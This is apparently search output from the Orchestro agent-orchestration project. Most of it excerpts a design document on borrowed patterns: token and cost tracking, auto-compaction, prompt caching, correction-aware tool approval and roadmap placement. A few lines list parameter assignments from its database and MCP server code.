docs/borrowed-patterns.md:1217:- `ToolRegistry.run()` — pre-execution gate for bash tool
docs/borrowed-patterns.md:1228:Claw's telemetry crate records `input_tokens`, `output_tokens`, and estimated cost for every model call in the session trace. The `AssistantEvent::Usage` variant captures per-turn token counts. Session-level aggregates are available for the `/cost` slash command.
docs/borrowed-patterns.md:1232:Orchestro logs events but does not track token counts or cost per run or per step. The rating system rates runs as `good`/`bad`/`edit`/`skip` but has no cost dimension. A cheap bad run and an expensive bad run look identical in the data — but they have different implications for the fine-tuning pipeline and for backend routing decisions.
docs/borrowed-patterns.md:1234:Token tracking also directly powers three other patterns in this document: auto-compaction (11.5) needs a token count to know when to fire; benchmark comparison benefits from cost-per-case metrics; and data-driven routing (pattern 16) can factor cost efficiency alongside success rate.
docs/borrowed-patterns.md:1238:Parse token usage from backend responses and record it in run_events:
docs/borrowed-patterns.md:1244:    append_event(run_id, "token_usage", {
docs/borrowed-patterns.md:1245:        "input_tokens": usage.get("prompt_tokens", 0),
docs/borrowed-patterns.md:1246:        "output_tokens": usage.get("completion_tokens", 0),
docs/borrowed-patterns.md:1247:        "cache_read_tokens": usage.get("cache_read_input_tokens", 0),
docs/borrowed-patterns.md:1248:        "cache_write_tokens": usage.get("cache_creation_input_tokens", 0),
docs/borrowed-patterns.md:1253:Add a `total_tokens` column to the `runs` table for fast querying:
docs/borrowed-patterns.md:1256:ALTER TABLE runs ADD COLUMN total_input_tokens INTEGER DEFAULT 0;
docs/borrowed-patterns.md:1257:ALTER TABLE runs ADD COLUMN total_output_tokens INTEGER DEFAULT 0;
docs/borrowed-patterns.md:1263:orchestro runs --show-tokens     # include token counts in run listing
docs/borrowed-patterns.md:1264:orchestro show <run-id>          # include token breakdown in run detail
docs/borrowed-patterns.md:1268:In the shell, add `/cost` to show session-level token totals, consistent with Claude Code's `/cost` slash command.
docs/borrowed-patterns.md:1273:- `OrchestroDB.complete_run()` — aggregate token counts from step events
docs/borrowed-patterns.md:1274:- Auto-compaction (11.5) — use actual token counts when available, estimate otherwise
docs/borrowed-patterns.md:1276:- Rating system — weight negative ratings by token cost in training data export
docs/borrowed-patterns.md:1334:- Tool-loop execution — `tool_search` results inform which tools are available next step
docs/borrowed-patterns.md:1371:    AVG(r.total_input_tokens + r.total_output_tokens) AS avg_tokens
docs/borrowed-patterns.md:1426:Add a correction-based approval elevation step in the tool execution path.
docs/borrowed-patterns.md:1428:When a tool call is about to execute, check whether any high-scoring correction was retrieved for the current run that mentions the tool being called:
docs/borrowed-patterns.md:1455:- Tool execution in `orchestrator.py` — check elevation before approval tier lookup
docs/borrowed-patterns.md:1472:| 5 | Worker state machine (6) | Foundational for recovery, policies, autonomy, and session management |
docs/borrowed-patterns.md:1477:| 10 | Auto-compaction with memory harvest (11.5) | Required for autonomous runs to survive long execution; harvest extracts memory as a side effect |
docs/borrowed-patterns.md:1478:| 11 | Prompt caching (12) | Low-hanging token savings; add alongside compaction while touching the request path |
docs/borrowed-patterns.md:1500:- **Phase 3.5 (Agentic Shell)**: Worker state machine (6), session persistence (4), command registry (8), escalation channels (11.6), token and cost tracking (14)
docs/borrowed-patterns.md:1506:The autonomy layer is not currently represented in the roadmap. It sits naturally between Phase 3.5 (Agentic Shell) and Phase 4 (Verifiers) — the shell must support background jobs and operator controls before autonomy makes sense, and verifiers become much more valuable once the agent can run them without human initiation.
docs/borrowed-patterns.md:1508:Patterns 12-17 (prompt caching, bash analysis, token tracking, ToolSearch, data-driven routing, correction-aware approval) are cross-cutting additions that do not map cleanly to a single roadmap phase. They are best introduced incrementally alongside the phases they enhance rather than as a dedicated phase.
docs/borrowed-patterns.md:1510:The patterns do not replace roadmap phases. They add implementation specificity to phases that were described at a goals level, fill gaps between phases that were not previously addressed (recovery, plugins, policies, sessions), and introduce a new autonomy phase and several cross-cutting improvements that the roadmap did not originally envision.

## Public mutable ownership surfaces
src/orchestro/db.py:2834:                params = [match_query]
src/orchestro/db.py:3055:                params = [query_embedding, model_name]
src/orchestro/mcp_server.py:222:            params = msg.get("params", {})
